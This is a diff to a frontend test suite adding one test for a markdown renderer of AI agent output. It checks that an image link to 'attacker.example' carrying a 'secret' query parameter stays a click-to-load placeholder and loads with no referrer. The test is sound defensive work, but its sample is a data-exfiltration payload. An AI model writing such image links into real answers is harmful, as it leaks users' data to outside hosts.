@@ -159,6 +159,20 @@ describe('SafeMarkdown — GFM agent output', () => {
     host.remove();
   });
 
+  it('never loads a remote image until you click it, so an answer can’t leak data through an image link', async () => {
+    const content = 'Here: ![chart](https://attacker.example/pixel.png?d=secret)';
+    await act(async () => root.render(<SafeMarkdown content={content} />));
+    expect(host.querySelector('img')).toBeNull();
+    const placeholder = host.querySelector<HTMLButtonElement>('[data-testid="markdown-image-placeholder"]')!;
+    expect(placeholder.textContent).toContain('chart');
+    expect(placeholder.textContent).toContain('attacker.example');
+
+    await act(async () => placeholder.click());
+    const img = host.querySelector('img')!;
+    expect(img.getAttribute('src')).toBe('https://attacker.example/pixel.png?d=secret');
+    expect(img.getAttribute('referrerpolicy')).toBe('no-referrer');
+  });
+
   it('wraps tables in a horizontal scroller and keeps headers, alignment and task checkboxes', async () => {
     const content = [
       '## Summary',
